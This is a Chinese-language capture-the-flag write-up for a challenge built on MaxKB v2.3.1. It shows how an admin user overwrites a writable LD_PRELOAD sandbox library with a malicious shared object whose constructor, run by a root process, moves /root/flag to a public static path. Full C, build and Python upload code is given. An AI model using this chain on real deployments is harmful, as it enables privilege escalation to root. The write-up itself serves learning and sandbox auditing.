# RootKB

## 题目简述

题目基于 MaxKB v2.3.1。拥有后台权限的用户可以创建 Python 工具，服务端会以低权限沙箱用户执行工具代码。为了限制网络访问，执行器给子进程设置了固定的 `LD_PRELOAD=/opt/maxkb-app/sandbox/sandbox.so`；但初始化逻辑又把整个沙箱目录递归改成了沙箱用户可写。目标是利用这处权限设计错误，从只能执行受限 Python 提升到读取 root 才能访问的 `/root/flag`。

## 解题过程

### 关键观察

问题不在 Python 代码本身，而在它启动前由 root 进程加载的共享库。执行器的关键行为可概括为：

```python
kwargs["env"] = {
    "LD_PRELOAD": f"{self.sandbox_path}/sandbox.so",
}
subprocess.run(["su", "-s", python_bin, "-c", command, sandbox_user], **kwargs)
```

`sandbox.so` 位于攻击者可写目录，却会被高权限执行链无条件加载，因此可以直接替换它。共享库构造函数会在程序入口前执行，适合放置不依赖后续 Python 逻辑的文件操作：

```c
#include <stdio.h>

__attribute__((constructor))
static void move_flag(void) {
    rename("/root/flag",
           "/opt/maxkb-app/apps/static/admin/assets/flag");
}
```

在与目标相同的 Linux 架构上编译共享库：

```bash
gcc -shared -fPIC -o sandbox.so exp.c
base64 -w0 sandbox.so
```

随后在“创建工具”的 Python 代码中写入编译结果，并再触发一次工具执行：

```python
import base64

so_data = base64.b64decode("<sandbox.so 的 Base64 数据>")
with open("/opt/maxkb-app/sandbox/sandbox.so", "wb") as f:
    f.write(so_data)

# 本次或下一次沙箱进程启动时，动态加载器会执行构造函数。
result = "written"
```

构造函数以加载该库的高权限进程身份运行，将 flag 移到静态资源目录；再通过对应的静态资源路径读取即可。比赛环境得到的验证结果为 `RCTF{trust_no_tool___dont_be_a_root_fool}`。

原 PDF 中给出的沙箱域名只是临时入口，不参与漏洞机制，因此不保留。

## 方法总结

- 核心技巧：覆盖可写的 `LD_PRELOAD` 目标库，利用共享库构造函数在高权限执行链中运行。
- 识别信号：固定预加载路径、预加载文件可由低权限用户改写、外层进程仍具有更高权限。
- 复用要点：审计沙箱时要同时检查“以谁的身份写文件”和“以谁的身份加载文件”；仅把最终解释器降权，无法弥补加载阶段的信任边界错误。
